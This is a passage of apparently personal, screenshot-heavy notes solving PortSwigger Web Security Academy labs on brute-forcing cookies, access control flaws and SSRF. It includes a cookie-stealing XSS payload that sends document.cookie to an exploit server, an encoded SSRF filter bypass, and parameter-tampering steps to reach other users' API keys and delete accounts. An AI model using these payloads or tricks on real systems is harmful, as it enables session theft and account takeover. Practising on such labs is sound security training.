/my-account?id=carlos</code> from /my-account?id=wiener </p><figure id="17c2063d-f08b-802d-8bdf-ecef5cd5cf17" class="image"><a href="image%2023.png"><img style="width:652px" src="image%2023.png"/></a></figure><p id="17c2063d-f08b-80e6-bde5-eb71f86537b5" class="">/my-account?id=carlos</p></details></li></ul><ul id="17c2063d-f08b-8001-b8ba-e164328c70fb" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie">https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie</a></summary><p id="17c2063d-f08b-80b1-a619-d574f4a0baea" class="">Lab #9 Brute-forcing a stay-logged-in cookie</p><p id="17c2063d-f08b-80df-8730-e0467a3f7239" class=""> Tw 0 </p><p id="17c2063d-f08b-80ea-83b4-d7164523d2dc" class="">Target Goal Obtain and brute force Carlos&#x27;s cookie to gain access to his account. </p><p id="17c2063d-f08b-802d-bc59-e1982fba1930" class="">Your credentials: wiener: peter </p><p id="17c2063d-f08b-80fd-b826-df54b504c0a7" class="">Victim&#x27;s username: carlos </p><p id="17c2063d-f08b-80d5-a182-fcf0045a52c9" class="">base64 (username: md5(password)) </p><p id="17c2063d-f08b-80f0-acec-e60d61850948" class="">base64(carlos:md5(x))</p><figure id="17c2063d-f08b-809f-8753-ce78e04c14e7" class="image"><a href="image%2024.png"><img style="width:652px" src="image%2024.png"/></a></figure><figure id="17c2063d-f08b-8032-b382-cf757e56ee82" class="image"><a href="image%2025.png"><img style="width:652px" src="image%2025.png"/></a></figure><figure id="17c2063d-f08b-8059-a3ff-f4af33f708c1" class="image"><a href="image%2026.png"><img style="width:652px" src="image%2026.png"/></a></figure><figure id="17c2063d-f08b-80dc-aa88-fb2919067848" class="image"><a href="image%2027.png"><img style="width:652px" src="image%2027.png"/></a></figure><p id="17c2063d-f08b-806f-9c32-ed528ef2e502" class="">
+</p><p id="17c2063d-f08b-8061-95a3-c95c6a46863f" class="">
+</p><p id="17c2063d-f08b-80af-afa6-ece51d354a08" class="">
+</p><p id="17c2063d-f08b-8097-8cb4-c4333436c649" class="">
+</p><p id="17c2063d-f08b-800c-b7b1-ddbbec370f41" class="">
+</p><p id="17c2063d-f08b-800e-9f75-c618ce7b8cb3" class="">
+</p></details></li></ul><ul id="17c2063d-f08b-80b9-9a93-e52a489ed820" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking">https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking</a></summary><p id="17d2063d-f08b-80ff-b3e5-e2679225fec0" class="">
+</p><figure id="17d2063d-f08b-807c-a9a2-ef64514202cc" class="image"><a href="image%2028.png"><img style="width:652px" src="image%2028.png"/></a></figure><figure id="17d2063d-f08b-808a-bf62-e8001ca85f2d" class="image"><a href="image%2029.png"><img style="width:652px" src="image%2029.png"/></a></figure><figure id="17d2063d-f08b-807d-90f6-f1013f7d11f4" class="image"><a href="image%2030.png"><img style="width:652px" src="image%2030.png"/></a></figure><p id="17d2063d-f08b-80d9-a50e-cb1241573e70" class="">XSS Vulnervality</p><figure id="17d2063d-f08b-8069-9495-db85c5556f64" class="image"><a href="image%2031.png"><img style="width:651.9750366210938px" src="image%2031.png"/></a></figure><p id="17d2063d-f08b-8081-b75c-e1a2313063c0" class="">xss used⇒<code>&lt;script&gt;document.location=&#x27; </code><code><a href="https://exploit-0a7c002b03b46afa82194c98016d0043.exploit-server.net/exploit&#x27;+document.cookie">https://exploit-0a7c002b03b46afa82194c98016d0043.exploit-server.net/exploit&#x27;+document.cookie</a></code><code>&lt;/script&gt;</code></p><figure id="17d2063d-f08b-8029-99b9-c98d003437fd" class="image"><a href="image%2032.png"><img style="width:652px" src="image%2032.png"/></a></figure><figure id="17d2063d-f08b-806a-9240-f9042f68bad0" class="image"><a href="image%2033.png"><img style="width:652px" src="image%2033.png"/></a></figure><figure id="17d2063d-f08b-803f-9710-cf681896d74e" class="image"><a href="image%2034.png"><img style="width:652px" src="image%2034.png"/></a></figure><figure id="17d2063d-f08b-80d7-be7d-c78c000ff3f8" class="image"><a href="image%2035.png"><img style="width:652px" src="image%2035.png"/></a></figure><figure id="17d2063d-f08b-8039-9861-ffccd45c3366" class="image"><a href="image%2036.png"><img style="width:652px" src="image%2036.png"/></a></figure><figure id="17d2063d-f08b-8030-8125-e502eeb57331" class="image"><a href="image%2037.png"><img style="width:652px" src="image%2037.png"/></a></figure><p id="17d2063d-f08b-8030-92c5-ded9ce109b45" class="">
+</p><p id="17c2063d-f08b-800a-944b-dbad92b47ae3" class="">
+</p></details></li></ul><ul id="17d2063d-f08b-8009-bb1f-e78dd2f9582e" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware">https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware</a></summary><figure id="17d2063d-f08b-8065-8576-d6c799f834fe" class="image"><a href="image%2038.png"><img style="width:652px" src="image%2038.png"/></a></figure><figure id="17d2063d-f08b-800c-b119-f569e687d3e8" class="image"><a href="image%2039.png"><img style="width:652px" src="image%2039.png"/></a></figure><figure id="17d2063d-f08b-805d-b101-c051d9c6d5c3" class="image"><a href="image%2040.png"><img style="width:652px" src="image%2040.png"/></a></figure><figure id="17d2063d-f08b-80d6-8d63-e406d2ef3520" class="image"><a href="image%2041.png"><img style="width:652px" src="image%2041.png"/></a></figure><figure id="17d2063d-f08b-80c7-afe0-cc24c23f1b7c" class="image"><a href="image%2042.png"><img style="width:1920px" src="image%2042.png"/></a></figure><figure id="17d2063d-f08b-8016-81fb-f99945caf4e9" class="image"><a href="image%2043.png"><img style="width:652px" src="image%2043.png"/></a></figure></details></li></ul><ul id="17d2063d-f08b-8075-ad17-ebb8ec6e6813" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change">https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change</a></summary><figure id="17d2063d-f08b-80ca-8662-f2564f5cc002" class="image"><a href="image%2044.png"><img style="width:652px" src="image%2044.png"/></a></figure><p id="17d2063d-f08b-802f-9dbe-db46db854a10" class="">
+</p><figure id="17d2063d-f08b-80da-be48-ea87be634959" class="image"><a href="image%2045.png"><img style="width:652px" src="image%2045.png"/></a></figure><figure id="17d2063d-f08b-801b-9918-f3832aa54726" class="image"><a href="image%2046.png"><img style="width:652px" src="image%2046.png"/></a></figure><figure id="17d2063d-f08b-80be-9738-f15117e5ed39" class="image"><a href="image%2047.png"><img style="width:652px" src="image%2047.png"/></a></figure><figure id="17d2063d-f08b-8078-8a84-fa935fd5575b" class="image"><a href="image%2048.png"><img style="width:652px" src="image%2048.png"/></a></figure><p id="17d2063d-f08b-807c-acad-d1115a568791" class="">
+</p></details></li></ul><ul id="17d2063d-f08b-8025-9c20-c4590a140bbf" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request">https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request</a></summary><figure id="17d2063d-f08b-80ce-9748-d3d0f0dec07c" class="image"><a href="image%2049.png"><img style="width:652px" src="image%2049.png"/></a></figure><figure id="17d2063d-f08b-800c-9fc0-fe1ddef4f97a" class="image"><a href="image%2050.png"><img style="width:652px" src="image%2050.png"/></a></figure></details></li></ul><ul id="17e2063d-f08b-80f8-9631-fec84360e425" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack">https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack</a></summary><p id="17e2063d-f08b-80db-ac23-e1cb1ce99468" class="">
+</p></details></li></ul><p id="17c2063d-f08b-802f-8814-de26406245e8" class="">
+</p></details></li></ul><ul id="17b2063d-f08b-8088-9b3a-dcd57cb3523b" class="toggle"><li><details open=""><summary><strong>Access Control</strong></summary><ul id="17b2063d-f08b-806d-8b8a-d39e6e982b2c" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter">https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter</a></summary><figure id="17f2063d-f08b-80d2-8736-d4ef54cf636a" class="image"><a href="image%2051.png"><img style="width:652px" src="image%2051.png"/></a></figure><figure id="17f2063d-f08b-806c-8dfe-fcf968073153" class="image"><a href="image%2052.png"><img style="width:652px" src="image%2052.png"/></a></figure><figure id="17f2063d-f08b-809d-a6be-f34b60649057" class="image"><a href="image%2053.png"><img style="width:652px" src="image%2053.png"/></a></figure><figure id="17f2063d-f08b-800a-839f-e40dad98825f" class="image"><a href="image%2054.png"><img style="width:652px" src="image%2054.png"/></a></figure></details></li></ul><ul id="1802063d-f08b-80a6-bdff-ea5f399bd59e" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/all-labs#access-control-vulnerabilities">https://portswigger.net/web-security/all-labs#access-control-vulnerabilities</a></summary><figure id="1802063d-f08b-806b-ab5f-f24db75f1e61" class="image"><a href="image%2055.png"><img style="width:652px" src="image%2055.png"/></a></figure><figure id="1802063d-f08b-8056-b860-c66aaec4906c" class="image"><a href="image%2056.png"><img style="width:652px" src="image%2056.png"/></a></figure><figure id="1802063d-f08b-8074-bb84-c49b8d1aa95c" class="image"><a href="image%2057.png"><img style="width:652px" src="image%2057.png"/></a></figure><figure id="1802063d-f08b-8050-a887-cddc1f95bd0d" class="image"><a href="image%2058.png"><img style="width:651.9750366210938px" src="image%2058.png"/></a></figure></details></li></ul><ul id="1802063d-f08b-8015-b416-d958ed690f65" class="toggle"><li><details open=""><summary><a href="https://0ab000a703dc7af080913aa0007900d4.web-security-academy.net/">https://0ab000a703dc7af080913aa0007900d4.web-security-academy.net/</a></summary><figure id="1802063d-f08b-80f6-a196-e8e9f57fd45b" class="image"><a href="image%2059.png"><img style="width:652px" src="image%2059.png"/></a></figure><figure id="1802063d-f08b-8008-8374-f490bf5a5cd0" class="image"><a href="image%2060.png"><img style="width:652px" src="image%2060.png"/></a></figure><figure id="1802063d-f08b-80df-a889-ebd9a841b8e8" class="image"><a href="image%2061.png"><img style="width:652px" src="image%2061.png"/></a></figure><figure id="1802063d-f08b-8080-ae04-fd16294a0434" class="image"><a href="image%2062.png"><img style="width:652px" src="image%2062.png"/></a></figure></details></li></ul><ul id="1802063d-f08b-808e-a9d6-f6618dc8798f" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter">https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter</a></summary><figure id="1802063d-f08b-8056-a622-e3c0a4c68559" class="image"><a href="image%2063.png"><img style="width:652px" src="image%2063.png"/></a></figure><figure id="1802063d-f08b-8020-b174-c57e5cd09784" class="image"><a href="image%2064.png"><img style="width:652px" src="image%2064.png"/></a></figure><figure id="1802063d-f08b-80e8-a173-eee117bad491" class="image"><a href="image%2065.png"><img style="width:652px" src="image%2065.png"/></a></figure><figure id="1802063d-f08b-8020-be33-c0393da78ba7" class="image"><a href="image%2066.png"><img style="width:652px" src="image%2066.png"/></a></figure><figure id="1802063d-f08b-8045-bd95-d3f585ddf7d7" class="image"><a href="image%2067.png"><img style="width:652px" src="image%2067.png"/></a></figure><figure id="1802063d-f08b-804f-a555-db0d49576a43" class="image"><a href="image%2068.png"><img style="width:652px" src="image%2068.png"/></a></figure></details></li></ul><ul id="1802063d-f08b-8094-8d29-c98910e8a090" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile">https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile</a></summary><figure id="1802063d-f08b-80ba-b2ce-c586a15ad549" class="image"><a href="image%2069.png"><img style="width:652px" src="image%2069.png"/></a></figure><p id="1802063d-f08b-8066-a4aa-f64c566d66c6" class="">then change the email  id of wiener then look the request in burpsuite </p><p id="1802063d-f08b-8098-a392-db4cd2d63a2f" class=""><code>POST /my-account/change-email</code> send it to repeter</p><figure id="1802063d-f08b-806e-b94b-c5433cd27b4a" class="image"><a href="image%2070.png"><img style="width:652px" src="image%2070.png"/></a></figure><p id="1802063d-f08b-80de-98a8-f82098e5e92e" class="">roleid sululd be 2</p><figure id="1802063d-f08b-80da-a157-c0f142e9e3bf" class="image"><a href="image%2071.png"><img style="width:652px" src="image%2071.png"/></a></figure><p id="1802063d-f08b-80ad-bce3-f394b98198c4" class="">then reload the page and delete carlos it solved</p></details></li></ul><ul id="1802063d-f08b-8003-bdfd-c89477119557" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter">https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter</a></summary><figure id="1802063d-f08b-80b0-8115-d65d45843dd3" class="image"><a href="image%2072.png"><img style="width:652px" src="image%2072.png"/></a></figure><figure id="1802063d-f08b-8083-a48c-c716e746a202" class="image"><a href="image%2073.png"><img style="width:652px" src="image%2073.png"/></a></figure><p id="1802063d-f08b-8012-9cb8-edb7154c6096" class="">username wiener with it’s api key </p><figure id="1802063d-f08b-80d3-9e56-c077c1031dbe" class="image"><a href="image%2074.png"><img style="width:652px" src="image%2074.png"/></a></figure><p id="1802063d-f08b-8044-b6ec-d902d36f7926" class="">change the wiener username into carlos and we get carlos api key</p><figure id="1802063d-f08b-801b-9b01-d842cd4ba865" class="image"><a href="image%2075.png"><img style="width:652px" src="image%2075.png"/></a></figure><figure id="1802063d-f08b-80c4-acbd-c3f478e894cc" class="image"><a href="image%2076.png"><img style="width:652px" src="image%2076.png"/></a></figure><figure id="1802063d-f08b-8098-a9da-e613d32540cb" class="image"><a href="image%2077.png"><img style="width:652px" src="image%2077.png"/></a></figure><p id="1802063d-f08b-8039-a1bb-c76cf135b595" class="">
+</p><p id="1802063d-f08b-80d5-bec9-f925fcff8e5c" class="">
+</p></details></li></ul><ul id="1802063d-f08b-8053-911b-fb1ffd6ddb86" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids">https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids</a></summary><figure id="1802063d-f08b-8052-9703-c9ad885752bc" class="image"><a href="image%2078.png"><img style="width:652px" src="image%2078.png"/></a></figure><p id="1802063d-f08b-806a-8f59-cc81b009cd06" class="">i have tried to find some thing but i can’t find it so i just go to the web page and home and i tried to find out carlos blog page it has GUIDs  so i replace it with the wiener GUIDs then i got the api key of carlos account .</p><p id="1802063d-f08b-8053-9f69-e854ecaf608c" class="">
+</p><p id="1802063d-f08b-80ca-a16a-c117db927530" class="">wiener with it’s GUIDs</p><figure id="1802063d-f08b-80ed-b399-f731b0815157" class="image"><a href="image%2079.png"><img style="width:652px" src="image%2079.png"/></a></figure><p id="1802063d-f08b-80d7-8e23-f06a815a1859" class="">
+</p><p id="1802063d-f08b-80b1-9490-f3dc997ad131" class="">carlos’s GUIDs</p><figure id="1802063d-f08b-805c-9f6c-f97a1bfc3875" class="image"><a href="image%2080.png"><img style="width:652px" src="image%2080.png"/></a></figure><figure id="1802063d-f08b-8048-a96d-f47ea0bff6dc" class="image"><a href="image%2081.png"><img style="width:652px" src="image%2081.png"/></a></figure><figure id="1802063d-f08b-803f-9d19-e23322b6d396" class="image"><a href="image%2082.png"><img style="width:652px" src="image%2082.png"/></a></figure><figure id="1802063d-f08b-808e-ab17-ffe5351c7d8a" class="image"><a href="image%2083.png"><img style="width:652px" src="image%2083.png"/></a></figure><p id="1802063d-f08b-808a-b976-e99734055301" class="">
+</p><p id="1802063d-f08b-80bb-a495-f85c973eb593" class="">
+</p><p id="1802063d-f08b-8088-84d8-f816ed9b0f32" class="">
+</p></details></li></ul><ul id="1802063d-f08b-808a-a0e2-ceaff19cb705" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect">https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect</a></summary><figure id="1802063d-f08b-806d-b9c6-ce46114977df" class="image"><a href="image%2084.png"><img style="width:652px" src="image%2084.png"/></a></figure><p id="1802063d-f08b-8074-8992-c83b50c4790f" class="">replace wiener with carlos and the check burpsuite carlos get  request  it has api key</p><figure id="1802063d-f08b-806c-ac52-f5db48b39f2b" class="image"><a href="image%2085.png"><img style="width:652px" src="image%2085.png"/></a></figure><p id="1802063d-f08b-8018-92fb-d5e54a502cab" class="">
+</p></details></li></ul><ul id="1802063d-f08b-80d3-b096-d77852add839" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure">https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure</a></summary><figure id="1812063d-f08b-8059-bee5-ca204c1cdd08" class="image"><a href="image%2086.png"><img style="width:652px" src="image%2086.png"/></a></figure><p id="1812063d-f08b-80d9-9c0f-ebffc0edfc96" class="">change wiener to administrator</p><figure id="1812063d-f08b-8002-8e94-eea878450a77" class="image"><a href="image%2087.png"><img style="width:652px" src="image%2087.png"/></a></figure><p id="1812063d-f08b-8058-a9fc-f34bfeea2d16" class="">administrator’s password</p><figure id="1812063d-f08b-805d-b846-f81f4e8640f3" class="image"><a href="image%2088.png"><img style="width:652px" src="image%2088.png"/></a></figure><p id="1812063d-f08b-808b-9c05-d6c7927ac2e4" class="">
+</p></details></li></ul><ul id="1812063d-f08b-8046-942c-f33380035c65" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references">https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references</a></summary><figure id="1812063d-f08b-80d2-bfdb-d9e1cfecf4b7" class="image"><a href="image%2089.png"><img style="width:652px" src="image%2089.png"/></a></figure><p id="1812063d-f08b-80f5-8035-c67433f32f91" class="">download view transcript </p><figure id="1812063d-f08b-80de-9ecf-c3aa9c65e831" class="image"><a href="image%2090.png"><img style="width:652px" src="image%2090.png"/></a></figure><figure id="1812063d-f08b-8008-8872-fb5a2efaf792" class="image"><a href="image%2091.png"><img style="width:652px" src="image%2091.png"/></a></figure><figure id="1812063d-f08b-8021-b38a-ff596b8708f5" class="image"><a href="image%2092.png"><img style="width:652px" src="image%2092.png"/></a></figure></details></li></ul><ul id="1812063d-f08b-805f-952b-ead5832a64ed" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented</a></summary><figure id="1812063d-f08b-809f-ab8c-cadfcd7e9f6a" class="image"><a href="image%2093.png"><img style="width:652px" src="image%2093.png"/></a></figure><figure id="1812063d-f08b-80f2-8407-c244348dd0ab" class="image"><a href="image%2094.png"><img style="width:651.9750366210938px" src="image%2094.png"/></a></figure><figure id="1812063d-f08b-80b3-9009-c76e4fbbd72e" class="image"><a href="image%2095.png"><img style="width:651.9750366210938px" src="image%2095.png"/></a></figure><figure id="1812063d-f08b-8084-9ecc-e1898cfb2ce8" class="image"><a href="image%2096.png"><img style="width:652px" src="image%2096.png"/></a></figure><figure id="1812063d-f08b-807f-afd4-efba42bff79b" class="image"><a href="image%2097.png"><img style="width:652px" src="image%2097.png"/></a></figure></details></li></ul><ul id="1812063d-f08b-80f0-b4d3-c0e6522bc577" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented">https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented</a></summary><figure id="1812063d-f08b-8039-bd07-cf98bc93a27d" class="image"><a href="image%2098.png"><img style="width:652px" src="image%2098.png"/></a></figure><figure id="1812063d-f08b-800b-859a-e3db6fd301b8" class="image"><a href="image%2099.png"><img style="width:652px" src="image%2099.png"/></a></figure><p id="1812063d-f08b-80bd-bfe1-c6a53e3e02dc" class="">send the /admin roles post request into repeter and replace it’s cookies with wiener chookie’s it will allow you then change the http request method post to get request and changer into wiener if you will get 302 then lab solved</p><figure id="1812063d-f08b-802a-9c78-ef8248f1a31b" class="image"><a href="image%20100.png"><img style="width:652px" src="image%20100.png"/></a></figure><figure id="1812063d-f08b-80a6-b98d-edc45fb0b2de" class="image"><a href="image%20101.png"><img style="width:652px" src="image%20101.png"/></a></figure></details></li></ul><ul id="1812063d-f08b-80b7-bcfd-f55a13adebe5" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step">https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step</a></summary><p id="1812063d-f08b-809e-91d4-eac6120ab601" class="">first login as administrator then upgrade carlos  then you will got the /admin roles post request send it to repeter  then logout and then login as wiener</p><p id="1812063d-f08b-80fe-80af-ce664befc395" class="">press f12 key and copy it’s cookie and replace with /admin roles post request then you will see 303 found then lab solved</p><figure id="1812063d-f08b-8045-8621-c3d4416ac3b8" class="image"><a href="image%20102.png"><img style="width:652px" src="image%20102.png"/></a></figure><figure id="1812063d-f08b-8095-b891-dfb76dedc014" class="image"><a href="image%20103.png"><img style="width:652px" src="image%20103.png"/></a></figure></details></li></ul><ul id="1812063d-f08b-8009-a55f-eae9fb53e6fe" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/access-control/lab-referer-based-access-control">https://portswigger.net/web-security/access-control/lab-referer-based-access-control</a></summary><p id="1812063d-f08b-803e-9912-ef3bfd83fc1c" class="">
+</p></details></li></ul></details></li></ul><ul id="1822063d-f08b-80e5-9c06-c583c4584507" class="toggle"><li><details open=""><summary><strong>Server-side request forgery (SSRF)</strong></summary><ul id="1822063d-f08b-80be-8947-c6d85d7ba73a" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost</a></summary><figure id="1822063d-f08b-808f-8e03-e8b34fea1e05" class="image"><a href="image%20104.png"><img style="width:652px" src="image%20104.png"/></a></figure><figure id="1822063d-f08b-802c-a42c-c9821aa4860a" class="image"><a href="image%20105.png"><img style="width:652px" src="image%20105.png"/></a></figure><figure id="1822063d-f08b-80ef-9132-d264195d72fb" class="image"><a href="image%20106.png"><img style="width:652px" src="image%20106.png"/></a></figure><figure id="1822063d-f08b-80bb-9819-c13a81a3ebe5" class="image"><a href="image%20107.png"><img style="width:652px" src="image%20107.png"/></a></figure><figure id="1822063d-f08b-80f5-97ae-fe4976009652" class="image"><a href="image%20108.png"><img style="width:652px" src="image%20108.png"/></a></figure><figure id="1822063d-f08b-80f2-9538-cf7ea0d31bc0" class="image"><a href="image%20109.png"><img style="width:1920px" src="image%20109.png"/></a></figure><p id="1822063d-f08b-80ff-8c41-c4e9587b10bc" class="">
+</p><p id="1822063d-f08b-801c-8804-d58b7c7f5c77" class="">
+</p><p id="1822063d-f08b-8076-8e89-d8e5a3ef60e0" class="">
+</p></details></li></ul><ul id="1822063d-f08b-80a7-975e-fd5626a6904f" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system">https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system</a></summary><figure id="1822063d-f08b-8060-928e-cae236761c51" class="image"><a href="image%20110.png"><img style="width:652px" src="image%20110.png"/></a></figure><figure id="1822063d-f08b-8083-9163-ce38a82c0028" class="image"><a href="image%20111.png"><img style="width:652px" src="image%20111.png"/></a></figure><figure id="1822063d-f08b-8070-8a51-db3a97e40a75" class="image"><a href="image%20112.png"><img style="width:652px" src="image%20112.png"/></a></figure><figure id="1822063d-f08b-8013-9b0d-fecd85f3461f" class="image"><a href="image%20113.png"><img style="width:652px" src="image%20113.png"/></a></figure><figure id="1822063d-f08b-80e4-bb64-c1dfd5707714" class="image"><a href="image%20114.png"><img style="width:652px" src="image%20114.png"/></a></figure><figure id="1822063d-f08b-8084-9ac9-df9ddf0f5ace" class="image"><a href="image%20115.png"><img style="width:652px" src="image%20115.png"/></a></figure><figure id="1822063d-f08b-80f4-81ea-cb5ab5b47471" class="image"><a href="image%20116.png"><img style="width:651.9874877929688px" src="image%20116.png"/></a></figure><figure id="1822063d-f08b-809c-bab0-c92e9ca7a24e" class="image"><a href="image%20117.png"><img style="width:652px" src="image%20117.png"/></a></figure><p id="1822063d-f08b-803d-a609-c215ed4a2608" class="">
+</p></details></li></ul><ul id="1822063d-f08b-803e-bcde-ec209b144ea0" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter">https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter</a></summary><figure id="1832063d-f08b-80a6-9269-f8837f9b3915" class="image"><a href="image%20118.png"><img style="width:652px" src="image%20118.png"/></a></figure><figure id="1832063d-f08b-8073-a4ec-f6025efa65e3" class="image"><a href="image%20119.png"><img style="width:652px" src="image%20119.png"/></a></figure><p id="1832063d-f08b-80a6-971a-e0270321f9af" class="">send it to repeter and then meanuplati stockapi header </p><figure id="1832063d-f08b-808f-a4a2-d0d0e600322b" class="image"><a href="image%20120.png"><img style="width:652px" src="image%20120.png"/></a></figure><p id="1832063d-f08b-80d2-9dfc-cc2694394901" class="">select ‘a’ letter from admin word and click right the then goto converat section goto URL then goto URL encode allcharaters the you will get from stockApi= <a href="http://127.1/admin">http://127.1/admin</a> to stockApi=http://127.1/%25%36%31dmin then you </p><figure id="1832063d-f08b-80b5-8d27-ce18f6e2e661" class="image"><a href="image%20121.png"><img style="width:652px" src="image%20121.png"/></a></figure><figure id="1832063d-f08b-8012-b5b3-f686425a1cf5" class="image"><a href="image%20122.png"><img style="width:651.9750366210938px" src="image%20122.png"/></a></figure><p id="1832063d-f08b-8091-8a7d-da65cf288b62" class="">then you will   <code>/admin/delete?username=carlos</code></p><p id="1832063d-f08b-808f-81d3-d78d6e921422" class="">then you can delete the user  carlos !</p><figure id="1832063d-f08b-8036-a8d1-ccce976b707b" class="image"><a href="image%20123.png"><img style="width:652px" src="image%20123.png"/></a></figure><p id="1832063d-f08b-80a1-9402-d45c1ac07d82" class="">then your leb will solved  😎😎😎😎😎😎 happy hacking </p><p id="1832063d-f08b-80e8-b11f-f30a553b2ed4" class="">
+</p><p id="1832063d-f08b-80c5-a2e9-de1f6a14cc21" class="">
+</p><p id="1832063d-f08b-8037-bdff-f11ebeba0298" class="">
+</p><p id="1832063d-f08b-8009-bf1e-e4c979971e3e" class="">
+</p><p id="1832063d-f08b-8072-ab39-e5317cc837cd" class="">
+</p><p id="1832063d-f08b-8092-860f-c5d46212c9e3" class="">
+</p></details></li></ul><ul id="1832063d-f08b-8027-bbba-e95bd8c25e36" class="toggle"><li><details open=""><summary><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection">https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</a></summary><figure id="1832063d-f08b-8086-b3af-d4b073aa610d" class="image"><a href="image%20124.png"><img style="width:651.9874877929688px" src="image%20124.png"/></a></figure><p id="1832063d-f08b-806d-af88-c13077b1751f" class="">go to the first product click on check stock button and then click next button </p><figure id="1832063d-f08b-80be-acc1-e544dbe4ef79" class="image"><a href="image%20125.png"><img style="width:652px" src="image%20125.png"/></a></figure><p id="1832063d-f08b-8076-a41c-fd08e46841e4" class="">then you will get the another page </p><figure id="1832063d-f08b-801c-b9e9-fa8b1e6b521d" class="image"><a href="image%20126.png"><img style="width:652px" src="image%20126.png"/></a></figure><p id="1832063d-f08b-8076-97c4-f8a8e7813f67" class="">and get these request in burpsuite </p><figure id="1832063d-f08b-802b-8530-d15101c91b94" class="image"><a href="image%20127.png"><img style="width:652px" src="image%20127.png"/></a></figure><figure id="1832063d-f08b-808d-89ef-fb57b0280c99" class="image"><a href="image%20128.png"><img style="width:652px" src="image%20128.png"/></a></figure><p id="1832063d-f08b-801a-8695-c414946906f9" class="">in repeter  copy the  <code>/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</code></p><figure id="1832063d-f08b-80b4-ae6a-d627ec60babd" class="image"><a href="image%20129.png"><img style="width:652px" src="image%20129.png"/></a></figure><p id="1832063d-f08b-8030-8336-cf452a2c4dcd" class="">past it in post request with the ip address which is given by portswigger and </p><figure id="1832063d-f08b-804e-ab05-ea3bccdce874" class="image"><a href="image%20130.png"><img style="width:652px" src="image%20130.png"/></a></figure><p id="1832063d-f08b-803c-961c-e42aaee47a98" class="">and decode url then click send </p><figure id="1832063d-f08b-80aa-ae04-cefc2e61c32c" class="image"><a href="image%20131.png"><img style="width:651.9874877929688px" src="image%20131.png"/></a></figure><figure id="1832063d-f08b-80c1-a3f8-d41d7376775a" class="image"><a href="image%20132.png"><img style="width:652px" src="image%20132.png"/></a></figure><figure id="1832063d-f08b-8079-b823-c9bfebb22b40" class="image"><a href="image%20133.png"><img style="width:651.9750366210938px" src="image%20133.png"/></a></figure><p id="1832063d-f08b-80e9-ba15-fbd19be31855" class="">press <code>ctrl+shift+u</code>  for encode url then press send button and  lab is solved and carlos’s account delete</p><p id="1832063d-f08b-80fa-8c92-e457f74aed99" class="">
+</p><figure id="1832063d-f08b-8098-945e-f20f6eb91d3b" class="image"><a href="image%20134.png"><img style="width:652px" src="image%20134.png"/></a></figure><p id="1832063d-f08b-80e8-878f-e1792a874c50" class="">
+</p><p id="1832063d-f08b-8028-b170-db4601528ea7" class="">
